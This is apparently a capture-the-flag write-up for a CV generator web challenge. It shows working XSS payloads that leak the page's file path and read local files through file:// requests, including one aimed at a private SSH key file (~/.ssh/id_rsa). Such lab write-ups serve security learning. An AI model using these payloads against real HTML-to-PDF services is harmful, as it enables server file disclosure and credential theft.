### Cvg3n3rat0r

Points: 102
Solves: 38

Ever wanted to get hired by your favorite E-corp? Then, generate your brand new CV and get hired every time.

BTW, have you ever heard the joke about putting your resume on the boss's computer? While that's probably a bad idea, grabbing the flag from /flag.txt
most definitely isn't!

Now with W3schools support!

[Website to Exploit](http://cvgenerator.zajebistyc.tf)

I knew the attack needed was XSS, but I needed to find out how to exploit the system. The first few lines were <p> paragraph tags with <b> bold inside them. I used my previous knowledge to inject <script> tags. I realized that document.location.href was needed, so I added that. I was then given the /tmp directory it was located in.

```
<script>document.write(document.location.href)</script>
```
  
  I found a medium article by r3d-buck3t to exfil XSS
  
[Medium](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)
  
  After slowly looking around the page, I noticed one I thought would work.
  
```  
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```  
  
  I switched the file path to what I needed, which was "file:///flag.txt"
  
  After 20 attempts, I finally achieved my answer.
